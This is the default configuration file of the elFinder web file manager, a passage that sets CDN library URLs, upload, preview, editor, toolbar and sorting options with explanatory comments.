/**
 * Default elFinder config
 *
 * @type  Object
 * @autor Dmitry (dio) Levashov
 */
 elFinder.prototype._options = {
	/**
	 * URLs of 3rd party libraries CDN
	 * 
	 * @type Object
	 */
	cdns : {
		// for editor etc.
		ace        : 'https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.12',
		codemirror : 'https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.61.1',
		ckeditor   : 'https://cdnjs.cloudflare.com/ajax/libs/ckeditor/4.16.1',
		ckeditor5  : 'https://cdn.ckeditor.com/ckeditor5/28.0.0',
		tinymce    : 'https://cdnjs.cloudflare.com/ajax/libs/tinymce/5.7.1',
		simplemde  : 'https://cdnjs.cloudflare.com/ajax/libs/simplemde/1.11.2',
		fabric     : 'https://cdnjs.cloudflare.com/ajax/libs/fabric.js/4.2.0',
		fabric16   : 'https://cdnjs.cloudflare.com/ajax/libs/fabric.js/1.6.7',
		tui        : 'https://uicdn.toast.com',
		// for quicklook etc.
		hls        : 'https://cdnjs.cloudflare.com/ajax/libs/hls.js/1.0.2/hls.min.js',
		dash       : 'https://cdnjs.cloudflare.com/ajax/libs/dashjs/3.2.2/dash.all.min.js',
		flv        : 'https://cdnjs.cloudflare.com/ajax/libs/flv.js/1.5.0/flv.min.js',
		videojs    : 'https://cdnjs.cloudflare.com/ajax/libs/video.js/7.12.1',
		prettify   : 'https://cdn.jsdelivr.net/gh/google/code-prettify@f1c3473acd1e8ea8c8c1a60c56e89f5cdd06f915/loader/run_prettify.js',
		psd        : 'https://cdnjs.cloudflare.com/ajax/libs/psd.js/3.2.0/psd.min.js',
		rar        : 'https://cdn.jsdelivr.net/gh/nao-pon/rar.js@6cef13ec66dd67992fc7f3ea22f132d770ebaf8b/rar.min.js',
		zlibUnzip  : 'https://cdn.jsdelivr.net/gh/imaya/zlib.js@0.3.1/bin/unzip.min.js', // need check unzipFiles() in quicklook.plugins.js when update
		zlibGunzip : 'https://cdn.jsdelivr.net/gh/imaya/zlib.js@0.3.1/bin/gunzip.min.js',
		bzip2      : 'https://cdn.jsdelivr.net/gh/nao-pon/bzip2.js@0.8.0/bzip2.js',
		marked     : 'https://cdnjs.cloudflare.com/ajax/libs/marked/2.0.3/marked.min.js',
		sparkmd5   : 'https://cdnjs.cloudflare.com/ajax/libs/spark-md5/3.0.0/spark-md5.min.js',
		jssha      : 'https://cdnjs.cloudflare.com/ajax/libs/jsSHA/3.2.0/sha.min.js',
		amr        : 'https://cdn.jsdelivr.net/gh/yxl/opencore-amr-js@dcf3d2b5f384a1d9ded2a54e4c137a81747b222b/js/amrnb.js',
		tiff       : 'https://cdn.jsdelivr.net/gh/seikichi/tiff.js@545ede3ee46b5a5bc5f06d65954e775aa2a64017/tiff.min.js'
	},
	
	/**
	 * Connector url. Required!
	 *
	 * @type String
	 */
	url : '',

	/**
	 * Ajax request type.
	 *
	 * @type String
	 * @default "get"
	 */
	requestType : 'get',
	
	/**
	 * Use CORS to connector url
	 * 
	 * @type Boolean|null  true|false|null(Auto detect)
	 */
	cors : null,

	/**
	 * Array of header names to return parrot out in HTTP headers received from the server
	 * 
	 * @type Array
	 */
	parrotHeaders : [],

	/**
	 * Maximum number of concurrent connections on request
	 * 
	 * @type Number
	 * @default 3
	 */
	requestMaxConn : 3,

	/**
	 * Transport to send request to backend.
	 * Required for future extensions using websockets/webdav etc.
	 * Must be an object with "send" method.
	 * transport.send must return jQuery.Deferred() object
	 *
	 * @type Object
	 * @default null
	 * @example
	 *  transport : {
	 *    init : function(elfinderInstance) { },
	 *    send : function(options) {
	 *      var dfrd = jQuery.Deferred();
	 *      // connect to backend ...
	 *      return dfrd;
	 *    },
	 *    upload : function(data) {
	 *      var dfrd = jQuery.Deferred();
	 *      // upload ...
	 *      return dfrd;
	 *    }
	 *    
	 *  }
	 **/
	transport : {},

	/**
	 * URL to upload file to.
	 * If not set - connector URL will be used
	 *
	 * @type String
	 * @default  ''
	 */
	urlUpload : '',

	/**
	 * Allow to drag and drop to upload files
	 *
	 * @type Boolean|String
	 * @default  'auto'
	 */
	dragUploadAllow : 'auto',
	
	/**
	 * Confirmation dialog displayed at the time of overwriting upload
	 * 
	 * @type Boolean
	 * @default true
	 */
	overwriteUploadConfirm : true,
	
	/**
	 * Max size of chunked data of file upload
	 * 
	 * @type Number
	 * @default  10485760(10MB)
	 */
	uploadMaxChunkSize : 10485760,
	
	/**
	 * Regular expression of file name to exclude when uploading folder
	 * 
	 * @type Object
	 * @default { win: /^(?:desktop\.ini|thumbs\.db)$/i, mac: /^\.ds_store$/i }
	 */
	folderUploadExclude : {
		win: /^(?:desktop\.ini|thumbs\.db)$/i,
		mac: /^\.ds_store$/i
	},
	
	/**
	 * Timeout for upload using iframe
	 *
	 * @type Number
	 * @default  0 - no timeout
	 */
	iframeTimeout : 0,
	
	/**
	 * Data to append to all requests and to upload files
	 *
	 * @type Object
	 * @default  {}
	 */
	customData : {},
	
	/**
	 * Event listeners to bind on elFinder init
	 *
	 * @type Object
	 * @default  {}
	 */
	handlers : {},

	/**
	 * Any custom headers to send across every ajax request
	 *
	 * @type Object
	 * @default {}
	 */
	customHeaders : {},

	/**
	 * Any custom xhrFields to send across every ajax request
	 *
	 * @type Object
	 * @default {}
	 */
	xhrFields : {},

	/**
	 * Interface language
	 *
	 * @type String
	 * @default "en"
	 */
	lang : 'en',

	/**
	 * Base URL of elfFinder library starting from Manager HTML
	 * Auto detect when empty value
	 * 
	 * @type String
	 * @default ""
	 */
	baseUrl : '',

	/**
	 * Base URL of i18n js files
	 * baseUrl + "js/i18n/" when empty value
	 * 
	 * @type String
	 * @default ""
	 */
	i18nBaseUrl : '',

	/**
	 * Base URL of worker js files
	 * baseUrl + "js/worker/" when empty value
	 * 
	 * @type String
	 * @default ""
	 */
	 workerBaseUrl : '',
	
	/**
	 * Auto load required CSS
	 * `false` to disable this function or
	 * CSS URL Array to load additional CSS files
	 * 
	 * @type Boolean|Array
	 * @default true
	 */
	cssAutoLoad : true,

	/**
	 * Theme to load
	 * {"themeid" : "Theme CSS URL"} or
	 * {"themeid" : "Theme manifesto.json URL"} or
	 * Theme manifesto.json Object
	 * {
	 *   "themeid" : {
	 *     "name":"Theme Name",
	 *     "cssurls":"Theme CSS URL",
	 *     "author":"Author Name",
	 *     "email":"Author Email",
	 *     "license":"License",
	 *     "link":"Web Site URL",
	 *     "image":"Screen Shot URL",
	 *     "description":"Description"
	 *   }
	 * }
	 * 
	 * @type Object
	 */
	themes : {},

	/**
	 * Theme id to initial theme
	 * 
	 * @type String|Null
	 */
	theme : null,

	/**
	 * Maximum value of error dialog open at the same time
	 * 
	 * @type Number
	 */
	maxErrorDialogs : 5,

	/**
	 * Additional css class for filemanager node.
	 *
	 * @type String
	 */
	cssClass : '',

	/**
	 * Active commands list. '*' means all of the commands that have been load.
	 * If some required commands will be missed here, elFinder will add its
	 *
	 * @type Array
	 */
	commands : ['*'],
	// Available commands list
	//commands : [
	//	'archive', 'back', 'chmod', 'colwidth', 'copy', 'cut', 'download', 'duplicate', 'edit', 'extract',
	//	'forward', 'fullscreen', 'getfile', 'help', 'home', 'info', 'mkdir', 'mkfile', 'netmount', 'netunmount',
	//	'open', 'opendir', 'paste', 'places', 'quicklook', 'reload', 'rename', 'resize', 'restore', 'rm',
	//	'search', 'sort', 'up', 'upload', 'view', 'zipdl'
	//],
	
	/**
	 * Commands options.
	 *
	 * @type Object
	 **/
	commandsOptions : {
		// // configure shortcuts of any command
		// // add `shortcuts` property into each command
		// any_command_name : {
		// 	shortcuts : [] // for disable this command's shortcuts
		// },
		// any_command_name : {
		// 	shortcuts : function(fm, shortcuts) {
		// 		// for add `CTRL + E` for this command action
		// 		shortcuts[0]['pattern'] += ' ctrl+e';
		// 		return shortcuts;
		// 	}
		// },
		// any_command_name : {
		// 	shortcuts : function(fm, shortcuts) {
		// 		// for full customize of this command's shortcuts
		// 		return [ { pattern: 'ctrl+e ctrl+down numpad_enter' + (fm.OS != 'mac' && ' enter') } ];
		// 	}
		// },
		// "getfile" command options.
		getfile : {
			onlyURL  : false,
			// allow to return multiple files info
			multiple : false,
			// allow to return filers info
			folders  : false,
			// action after callback (""/"close"/"destroy")
			oncomplete : '',
			// action when callback is fail (""/"close"/"destroy")
			onerror : '',
			// get path before callback call
			getPath    : true, 
			// get image sizes before callback call
			getImgSize : false
		},
		open : {
			// HTTP method that request to the connector when item URL is not valid URL.
			// If you set to "get" will be displayed request parameter in the browser's location field
			// so if you want to conceal its parameters should be given "post".
			// Nevertheless, please specify "get" if you want to enable the partial request by HTTP Range header.
			method : 'post',
			// Where to open into : 'window'(default), 'tab' or 'tabs'
			// 'tabs' opens in each tabs
			into   : 'window',
			// Default command list of action when select file
			// String value that is 'Command Name' or 'Command Name1/CommandName2...'
			selectAction : 'open'
		},
		opennew : {
			// URL of to open elFinder manager
			// Default '' : Origin URL
			url : '',
			// Use search query of origin URL
			useOriginQuery : true
		},
		// "upload" command options.
		upload : {
			// Open elFinder upload dialog: 'button' OR Open system OS upload dialog: 'uploadbutton'
			ui : 'button'
		},
		// "download" command options.
		download : {
			// max request to download files when zipdl disabled
			maxRequests : 10,
			// minimum count of files to use zipdl
			minFilesZipdl : 2
		},
		// "quicklook" command options.
		quicklook : {
			autoplay : true,
			width    : 450,
			height   : 300,
			// ControlsList of HTML5 audio/video preview
			// see https://googlechrome.github.io/samples/media/controlslist.html
			mediaControlsList : '', // e.g. 'nodownload nofullscreen noremoteplayback'
			// Show toolbar of PDF preview (with <embed> tag)
			pdfToolbar : true,
			// Maximum lines to preview at initial
			textInitialLines : 100,
			// Maximum lines to preview by prettify
			prettifyMaxLines : 300,
			// quicklook window must be contained in elFinder node on window open (true|false)
			contain : false,
			// preview window into NavDock (0 : undocked | 1 : docked(show) | 2 : docked(hide))
			docked   : 0,
			// Docked preview height ('auto' or Number of pixel) 'auto' is setted to the Navbar width
			dockHeight : 'auto',
			// media auto play when docked
			dockAutoplay : false,
			// Google Maps API key (Require Maps JavaScript API)
			googleMapsApiKey : '',
			// Google Maps API Options
			googleMapsOpts : {
				maps : {},
				kml : {
					suppressInfoWindows : false,
					preserveViewport : false
				}
			},
			// ViewerJS (https://viewerjs.org/) Options
			// To enable this you need to place ViewerJS on the same server as elFinder and specify that URL in `url`.
			viewerjs : {
				url: '', // Example '/ViewerJS/index.html'
				mimes: ['application/pdf', 'application/vnd.oasis.opendocument.text', 'application/vnd.oasis.opendocument.spreadsheet', 'application/vnd.oasis.opendocument.presentation'],
				pdfNative: true // Use Native PDF Viewer first
			},
			// MIME types to CAD-Files and 3D-Models online viewer on sharecad.org
			// Example ['image/vnd.dwg', 'image/vnd.dxf', 'model/vnd.dwf', 'application/vnd.hp-hpgl', 'application/plt', 'application/step', 'model/iges', 'application/vnd.ms-pki.stl', 'application/sat', 'image/cgm', 'application/x-msmetafile']
			sharecadMimes : [],
			// MIME types to use Google Docs online viewer
			// Example ['application/pdf', 'image/tiff', 'application/vnd.ms-office', 'application/msword', 'application/vnd.ms-word', 'application/vnd.ms-excel', 'application/vnd.ms-powerpoint', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', 'application/vnd.openxmlformats-officedocument.presentationml.presentation', 'application/postscript', 'application/rtf']
			googleDocsMimes : [],
			// MIME types to use Microsoft Office Online viewer
			// Example ['application/msword', 'application/vnd.ms-word', 'application/vnd.ms-excel', 'application/vnd.ms-powerpoint', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet', 'application/vnd.openxmlformats-officedocument.presentationml.presentation', 'application/vnd.oasis.opendocument.text', 'application/vnd.oasis.opendocument.spreadsheet', 'application/vnd.oasis.opendocument.presentation']
			// These MIME types override "googleDocsMimes"
			officeOnlineMimes : [],
			// File size threshold when using the dim command for obtain the image size necessary to image preview
			getDimThreshold : '200K',
			// Max filesize to show filenames of the zip/tar/gzip/bzip file 
			unzipMaxSize : '50M',
			// MIME-Type regular expression that does not check empty files
			mimeRegexNotEmptyCheck : /^application\/vnd\.google-apps\./
		},
		// "edit" command options.
		edit : {
			// dialog width, integer(px) or integer+'%' (example: 650, '80%' ...)
			dialogWidth : void(0),
			// dialog height, integer(px) or integer+'%' (example: 650, '80%' ...)
			dialogHeight : void(0),
			// list of allowed mimetypes to edit of text files
			// if empty - any text files can be edited
			mimes : [],
			// MIME-types to unselected as default of "File types to enable with "New file"" in preferences
			mkfileHideMimes : [],
			// MIME-types of text file to make empty file
			makeTextMimes : ['text/plain', 'text/css', 'text/html'],
			// Use the editor stored in the browser
			// This value allowd overwrite with user preferences
			useStoredEditor : false,
			// Open the maximized editor window
			// This value allowd overwrite with user preferences
			editorMaximized : false,
			// edit files in wysisyg's
			editors : [
				// {
				// 	/**
				// 	 * editor info
				// 	 * @type  Object
				// 	 */
				// 	info : { name: 'Editor Name' },
				// 	/**
				// 	 * files mimetypes allowed to edit in current wysisyg
				// 	 * @type  Array
				// 	 */
				// 	mimes : ['text/html'], 
				// 	/**
				// 	 * HTML element for editing area (optional for text editor)
				// 	 * @type  String
				// 	 */
				// 	html : '<textarea></textarea>', 
				// 	/**
				// 	 * Initialize editing area node (optional for text editor)
				// 	 * 
				// 	 * @param  String  dialog DOM id
				// 	 * @param  Object  target file object
				// 	 * @param  String  target file content (text or Data URI Scheme(binary file))
				// 	 * @param  Object  elFinder instance
				// 	 * @type  Function
				// 	 */
				// 	init : function(id, file, content, fm) {
				// 		jQuery(this).attr('id', id + '-text').val(content);
				// 	},
				// 	/**
				// 	 * Get edited contents (optional for text editor)
				// 	 * @type  Function
				// 	 */
				// 	getContent : function() {
				// 		return jQuery(this).val();
				// 	},
				// 	/**
				// 	 * Called when "edit" dialog loaded.
				// 	 * Place to init wysisyg.
				// 	 * Can return wysisyg instance
				// 	 *
				// 	 * @param  DOMElement  textarea node
				// 	 * @return Object      editor instance|jQuery.Deferred(return instance on resolve())
				// 	 */
				// 	load : function(textarea) { },
				// 	/**
				// 	 * Called before "edit" dialog closed.
				// 	 * Place to destroy wysisyg instance.
				// 	 *
				// 	 * @param  DOMElement  textarea node
				// 	 * @param  Object      wysisyg instance (if was returned by "load" callback)
				// 	 * @return void
				// 	 */
				// 	close : function(textarea, instance) { },
				// 	/**
				// 	 * Called before file content send to backend.
				// 	 * Place to update textarea content if needed.
				// 	 *
				// 	 * @param  DOMElement  textarea node
				// 	 * @param  Object      wysisyg instance (if was returned by "load" callback)
				// 	 * @return void
				// 	 */
				// 	save : function(textarea, instance) {},
				// 	/**
				// 	 * Called after load() or save().
				// 	 * Set focus to wysisyg editor.
				// 	 *
				// 	 * @param  DOMElement  textarea node
				// 	 * @param  Object      wysisyg instance (if was returned by "load" callback)
				// 	 * @return void
				// 	 */
				// 	focus : function(textarea, instance) {}
				// 	/**
				// 	 * Called after dialog resized..
				// 	 *
				// 	 * @param  DOMElement  textarea node
				// 	 * @param  Object      wysisyg instance (if was returned by "load" callback)
				// 	 * @param  Object      resize event object
				// 	 * @param  Object      data object
				// 	 * @return void
				// 	 */
				// 	resize : function(textarea, instance, event, data) {}
				// 
				// }
			],
			// Character encodings of select box
			encodings : ['Big5', 'Big5-HKSCS', 'Cp437', 'Cp737', 'Cp775', 'Cp850', 'Cp852', 'Cp855', 'Cp857', 'Cp858', 
				'Cp862', 'Cp866', 'Cp874', 'EUC-CN', 'EUC-JP', 'EUC-KR', 'GB18030', 'ISO-2022-CN', 'ISO-2022-JP', 'ISO-2022-KR', 
				'ISO-8859-1', 'ISO-8859-2', 'ISO-8859-3', 'ISO-8859-4', 'ISO-8859-5', 'ISO-8859-6', 'ISO-8859-7', 
				'ISO-8859-8', 'ISO-8859-9', 'ISO-8859-13', 'ISO-8859-15', 'KOI8-R', 'KOI8-U', 'Shift-JIS', 
				'Windows-1250', 'Windows-1251', 'Windows-1252', 'Windows-1253', 'Windows-1254', 'Windows-1257'],
			// options for extra editors
			extraOptions : {
				// upload command options
				uploadOpts : {},
				// TUI Image Editor's options
				tuiImgEditOpts : {
					// Path prefix of icon-a.svg, icon-b.svg, icon-c.svg and icon-d.svg in the Theme. 
					// `iconsPath` MUST follow the same origin policy.
					iconsPath : void(0), // default is "./img/tui-"
					// Theme object
					theme : {}
				},
				// Pixo image editor constructor options - https://pixoeditor.com/
				// Require 'apikey' to enable it
				pixo: {
					apikey: ''
				},
				// Browsing manager URL for CKEditor, TinyMCE
				// Uses self location with the empty value or not defined.
				//managerUrl : 'elfinder.html'
				managerUrl : null,
				// CKEditor editor options
				ckeditor: {},
				// CKEditor 5 editor options
				ckeditor5: {
					// builds mode - 'classic', 'inline', 'balloon', 'balloon-block' or 'decoupled-document'
					mode: 'decoupled-document'
				},
				// TinyMCE editor options
				tinymce : {},
				// Setting for Online-Convert.com
				onlineConvert : {
					maxSize  : 100, // (MB) Max 100MB on free account
					showLink : true // It must be enabled with free account
				}
			}
		},
		fullscreen : {
			// fullscreen mode 'screen'(When the browser supports it) or 'window'
			mode: 'screen' // 'screen' or 'window'
		},
		search : {
			// Incremental search from the current view
			incsearch : {
				enable : true, // is enable true or false
				minlen : 1,    // minimum number of characters
				wait   : 500   // wait milliseconds
			},
			// Additional search types
			searchTypes : {
				// "SearchMime" is implemented in default
				SearchMime : {           // The key is search type that send to the connector
					name : 'btnMime',    // Button text to be processed in i18n()
					title : 'searchMime',// Button title to be processed in i18n()
					incsearch : 'mime'   // Incremental search target filed name of the file object
					// Or Callable function
					/* incsearch function example
					function(queryObject, cwdHashes, elFinderInstance) {
						var q = queryObject.val;
						var regex = queryObject.regex;
						var matchedHashes = jQuery.grep(cwdHashes, function(hash) {
							var file = elFinderInstance.file(hash);
							return (file && file.mime && file.mime.match(regex))? true : false;
						});
						return matchedHashes;
					}
					*/
				}
			}
		},
		// "info" command options.
		info : {
			// If the URL of the Directory is null,
			// it is assumed that the link destination is a URL to open the folder in elFinder
			nullUrlDirLinkSelf : true,
			// Information items to be hidden by default
			// These name are 'size', 'aliasfor', 'path', 'link', 'dim', 'modify', 'perms', 'locked', 'owner', 'group', 'perm' and your custom info items label
			hideItems : [],
			// Maximum file size (byte) to get file contents hash (md5, sha256 ...)
			showHashMaxsize : 104857600, // 100 MB
			// Array of hash algorisms to show on info dialog
			// These name are 'md5', 'sha1', 'sha224', 'sha256', 'sha384', 'sha512', 'sha3-224', 'sha3-256', 'sha3-384', 'sha3-512', 'shake128' and 'shake256'
			showHashAlgorisms : ['md5', 'sha256'],
			// Options for fm.getContentsHashes()
			showHashOpts : {
				shake128len : 256,
				shake256len : 512
			},
			custom : {
				// /**
				//  * Example of custom info `desc`
				//  */
				// desc : {
				// 	/**
				// 	 * Lable (require)
				// 	 * It is filtered by the `fm.i18n()`
				// 	 * 
				// 	 * @type String
				// 	 */
				// 	label : 'Description',
				// 	
				// 	/**
				// 	 * Template (require)
				// 	 * `{id}` is replaced in dialog.id
				// 	 * 
				// 	 * @type String
				// 	 */
				// 	tpl : '<div class="elfinder-info-desc"><span class="elfinder-spinner"></span></div>',
				// 	
				// 	/**
				// 	 * Restricts to mimetypes (optional)
				// 	 * Exact match or category match
				// 	 * 
				// 	 * @type Array
				// 	 */
				// 	mimes : ['text', 'image/jpeg', 'directory'],
				// 	
				// 	/**
				// 	 * Restricts to file.hash (optional)
				// 	 * 
				// 	 * @ type Regex
				// 	 */
				// 	hashRegex : /^l\d+_/,
				// 
				// 	/**
				// 	 * Request that asks for the description and sets the field (optional)
				// 	 * 
				// 	 * @type Function
				// 	 */
				// 	action : function(file, fm, dialog) {
				// 		fm.request({
				// 		data : { cmd : 'desc', target: file.hash },
				// 			preventDefault: true,
				// 		})
				// 		.fail(function() {
				// 			dialog.find('div.elfinder-info-desc').html(fm.i18n('unknown'));
				// 		})
				// 		.done(function(data) {
				// 			dialog.find('div.elfinder-info-desc').html(data.desc);
				// 		});
				// 	}
				// }
			}
		},
		mkdir: {
			// Enable automatic switching function ["New Folder" / "Into New Folder"] of toolbar buttton
			intoNewFolderToolbtn: false
		},
		resize: {
			// defalt status of snap to 8px grid of the jpeg image ("enable" or "disable")
			grid8px : 'disable',
			// Preset size array [width, height]
			presetSize : [[320, 240], [400, 400], [640, 480], [800,600]],
			// File size (bytes) threshold when using the `dim` command for obtain the image size necessary to start editing
			getDimThreshold : 204800,
			// File size (bytes) to request to get substitute image (400px) with the `dim` command
			dimSubImgSize : 307200
		},
		rm: {
			// If trash is valid, items moves immediately to the trash holder without confirm.
			quickTrash : true,
			// Maximum wait seconds when checking the number of items to into the trash
			infoCheckWait : 10,
			// Maximum number of items that can be placed into the Trash at one time
			toTrashMaxItems : 1000
		},
		paste : {
			moveConfirm : false // Display confirmation dialog when moving items
		},
		help : {
			// Tabs to show
			view : ['about', 'shortcuts', 'help', 'integrations', 'debug'],
			// HTML source URL of the heip tab
			helpSource : ''
		},
		preference : {
			// dialog width
			width: 600,
			// dialog height
			height: 400,
			// tabs setting see preference.js : build()
			categories: null,
			// preference setting see preference.js : build()
			prefs: null,
			// language setting  see preference.js : build()
			langs: null,
			// Command list of action when select file
			// Array value are 'Command Name' or 'Command Name1/CommandName2...'
			selectActions : ['open', 'edit/download', 'resize/edit/download', 'download', 'quicklook']
		}
	},
	
	/**
	 * Disabled commands relationship
	 * 
	 * @type Object
	 */
	disabledCmdsRels : {
		'get'       : ['edit'],
		'rm'        : ['cut', 'empty'],
		'file&url=' : ['download', 'zipdl'] // file command and volume options url is empty
	},

	/**
	 * Callback for prepare boot up
	 * 
	 * - The this object in the function is an elFinder node
	 * - The first parameter is elFinder Instance
	 * - The second parameter is an object of other parameters
	 *   For now it can use `dfrdsBeforeBootup` Array
	 * 
	 * @type Function
	 * @default null
	 * @return void
	 */
	bootCallback : null,
	
	/**
	 * Callback for "getfile" commands.
	 * Required to use elFinder with WYSIWYG editors etc..
	 *
	 * @type Function
	 * @default null (command not active)
	 */
	getFileCallback : null,
	
	/**
	 * Default directory view. icons/list
	 *
	 * @type String
	 * @default "icons"
	 */
	defaultView : 'icons',
	
	/**
	 * Hash of default directory path to open
	 * 
	 * NOTE: This setting will be disabled if the target folder is specified in location.hash.
	 * 
	 * If you want to find the hash in Javascript
	 * can be obtained with the following code. (In the case of a standard hashing method)
	 * 
	 * var volumeId = 'l1_'; // volume id
	 * var path = 'path/to/target'; // without root path
	 * //var path = 'path\\to\\target'; // use \ on windows server
	 * var hash = volumeId + btoa(path).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '.').replace(/\.+$/, '');
	 * 
	 * @type String
	 * @default ""
	 */
	startPathHash : '',

	/**
	 * Emit a sound when a file is deleted
	 * Sounds are in sounds/ folder
	 * 
	 * @type Boolean
	 * @default true
	 */
	sound : true,
	
	/**
	 * UI plugins to load.
	 * Current dir ui and dialogs loads always.
	 * Here set not required plugins as folders tree/toolbar/statusbar etc.
	 *
	 * @type Array
	 * @default ['toolbar', 'places', 'tree', 'path', 'stat']
	 * @full ['toolbar', 'places', 'tree', 'path', 'stat']
	 */
	ui : ['toolbar', 'tree', 'path', 'stat'],
	
	/**
	 * Some UI plugins options.
	 * @type Object
	 */
	uiOptions : {
		// toolbar configuration
		toolbar : [
			['home', 'back', 'forward', 'up', 'reload'],
			['netmount'],
			['mkdir', 'mkfile', 'upload'],
			['open', 'download', 'getfile'],
			['undo', 'redo'],
			['copy', 'cut', 'paste', 'rm', 'empty', 'hide'],
			['duplicate', 'rename', 'edit', 'resize', 'chmod'],
			['selectall', 'selectnone', 'selectinvert'],
			['quicklook', 'info'],
			['extract', 'archive'],
			['search'],
			['view', 'sort'],
			['fullscreen']
		],
		// toolbar extra options
		toolbarExtra : {
			// also displays the text label on the button (true / false / 'none')
			displayTextLabel: false,
			// Exclude `displayTextLabel` setting UA type
			labelExcludeUA: ['Mobile'],
			// auto hide on initial open
			autoHideUA: ['Mobile'],
			// Initial setting value of hide button in toolbar setting
			defaultHides: ['home', 'reload'],
			// show Preference button ('none', 'auto', 'always')
			// If you do not include 'preference' in the context menu you should specify 'auto' or 'always'
			showPreferenceButton: 'none',
			// show Preference button into contextmenu of the toolbar (true / false)
			preferenceInContextmenu: false
		},
		// directories tree options
		tree : {
			// set path info to attr title
			attrTitle : true,
			// expand current root on init
			openRootOnLoad : true,
			// expand current work directory on open
			openCwdOnOpen  : true,
			// auto loading current directory parents and do expand their node.
			syncTree : true,
			// Maximum number of display of each child trees
			// The tree of directories with children exceeding this number will be split
			subTreeMax : 100,
			// Numbar of max connctions of subdirs request
			subdirsMaxConn : 2,
			// Number of max simultaneous processing directory of subdirs
			subdirsAtOnce : 5,
			// Durations of each animations
			durations : {
				slideUpDown : 'fast',
				autoScroll : 'fast'
			}
			// ,
			// /**
			//  * Add CSS class name to navbar directories (optional)
			//  * see: https://github.com/Studio-42/elFinder/pull/1061,
			//  *      https://github.com/Studio-42/elFinder/issues/1231
			//  * 
			//  * @type Function
			//  */
			// getClass: function(dir) {
			// 	// e.g. This adds the directory's name (lowercase) with prefix as a CSS class
			// 	return 'elfinder-tree-' + dir.name.replace(/[ "]/g, '').toLowerCase();
			// }
		},
		// navbar options
		navbar : {
			minWidth : 150,
			maxWidth : 500,
			// auto hide on initial open
			autoHideUA: [] // e.g. ['Mobile']
		},
		navdock : {
			// disabled navdock ui
			disabled : false,
			// percentage of initial maximum height to work zone
			initMaxHeight : '50%',
			// percentage of maximum height to work zone by user resize action
			maxHeight : '90%'
		},
		cwd : {
			// display parent folder with ".." name :)
			oldSchool : false,
			
			// fm.UA types array to show item select checkboxes e.g. ['All'] or ['Mobile'] etc. default: ['Touch']
			showSelectCheckboxUA : ['Touch'],

			// Enable dragout by dragstart with Alt key or Shift key
			metakeyDragout : true,
			
			// file info columns displayed
			listView : {
				// name is always displayed, cols are ordered
				// e.g. ['perm', 'date', 'size', 'kind', 'owner', 'group', 'mode']
				// mode: 'mode'(by `fileModeStyle` setting), 'modestr'(rwxr-xr-x) , 'modeoct'(755), 'modeboth'(rwxr-xr-x (755))
				// 'owner', 'group' and 'mode', It's necessary set volume driver option "statOwner" to `true`
				// for custom, characters that can be used in the name is `a-z0-9_`
				columns : ['perm', 'date', 'size', 'kind'],
				// override this if you want custom columns name
				// example
				// columnsCustomName : {
				//		date : 'Last modification',
				// 		kind : 'Mime type'
				// }
				columnsCustomName : {},
				// fixed list header colmun
				fixedHeader : true
			},

			// icons view setting
			iconsView : {
				// default icon size (0-3 in default CSS (cwd.css - elfinder-cwd-size[number]))
				size: 0,
				// number of maximum size (3 in default CSS (cwd.css - elfinder-cwd-size[number]))
				// uses in preference.js
				sizeMax: 3,
				// Name of each size
				sizeNames: {
					0: 'viewSmall',
					1: 'viewMedium',
					2: 'viewLarge',
					3: 'viewExtraLarge' 
				}
			},

			// /**
			//  * Add CSS class name to cwd directories (optional)
			//  * see: https://github.com/Studio-42/elFinder/pull/1061,
			//  *      https://github.com/Studio-42/elFinder/issues/1231
			//  * 
			//  * @type Function
			//  */
			// ,
			// getClass: function(file) {
			// 	// e.g. This adds the directory's name (lowercase) with prefix as a CSS class
			// 	return 'elfinder-cwd-' + file.name.replace(/[ "]/g, '').toLowerCase();
			//}
			
			//,
			//// Template placeholders replacement rules for overwrite. see ui/cwd.js replacement
			//replacement : {
			//	tooltip : function(f, fm) {
			//		var list = fm.viewType == 'list', // current view type
			//			query = fm.searchStatus.state == 2, // is in search results
			//			title = fm.formatDate(f) + (f.size > 0 ? ' ('+fm.formatSize(f.size)+')' : ''),
			//			info  = '';
			//		if (query && f.path) {
			//			info = fm.escape(f.path.replace(/\/[^\/]*$/, ''));
			//		} else {
			//			info = f.tooltip? fm.escape(f.tooltip).replace(/\r/g, '&#13;') : '';
			//		}
			//		if (list) {
			//			info += (info? '&#13;' : '') + fm.escape(f.name);
			//		}
			//		return info? info + '&#13;' + title : title;
			//	}
			//}
		},
		path : {
			// Move to head of work zone without UI navbar
			toWorkzoneWithoutNavbar : true
		},
		dialog : {
			// Enable to auto focusing on mouse over in the target form element
			focusOnMouseOver : true
		},
		toast : {
			animate : {
				// to show
				showMethod: 'fadeIn', // fadeIn, slideDown, and show are built into jQuery
				showDuration: 300,    // milliseconds
				showEasing: 'swing',  // swing and linear are built into jQuery
				// timeout to hide
				timeOut: 3000,
				// to hide
				hideMethod: 'fadeOut',
				hideDuration: 1500,
				hideEasing: 'swing'
			}
		}
	},

	/**
	 * MIME regex of send HTTP header "Content-Disposition: inline" or allow preview in quicklook
	 * This option will overwrite by connector configuration
	 * 
	 * @type String
	 * @default '^(?:(?:image|video|audio)|text/plain|application/pdf$)'
	 * @example
	 *  dispInlineRegex : '.',  // is allow inline of all of MIME types
	 *  dispInlineRegex : '$^', // is not allow inline of all of MIME types
	 */
	dispInlineRegex : '^(?:(?:image|video|audio)|application/(?:x-mpegURL|dash\+xml)|(?:text/plain|application/pdf)$)',

	/**
	 * Display only required files by types
	 *
	 * @type Array
	 * @default []
	 * @example
	 *  onlyMimes : ["image"] - display all images
	 *  onlyMimes : ["image/png", "application/x-shockwave-flash"] - display png and flash
	 */
	onlyMimes : [],

	/**
	 * Custom files sort rules.
	 * All default rules (name/size/kind/date/perm/mode/owner/group) set in elFinder._sortRules
	 *
	 * @type {Object}
	 * @example
	 * sortRules : {
	 *   name : function(file1, file2) { return file1.name.toLowerCase().localeCompare(file2.name.toLowerCase()); }
	 * }
	 */
	sortRules : {},

	/**
	 * Default sort type.
	 *
	 * @type {String}
	 */
	sortType : 'name',
	
	/**
	 * Default sort order.
	 *
	 * @type {String}
	 * @default "asc"
	 */
	sortOrder : 'asc',
	
	/**
	 * Display folders first?
	 *
	 * @type {Boolean}
	 * @default true
	 */
	sortStickFolders : true,
	
	/**
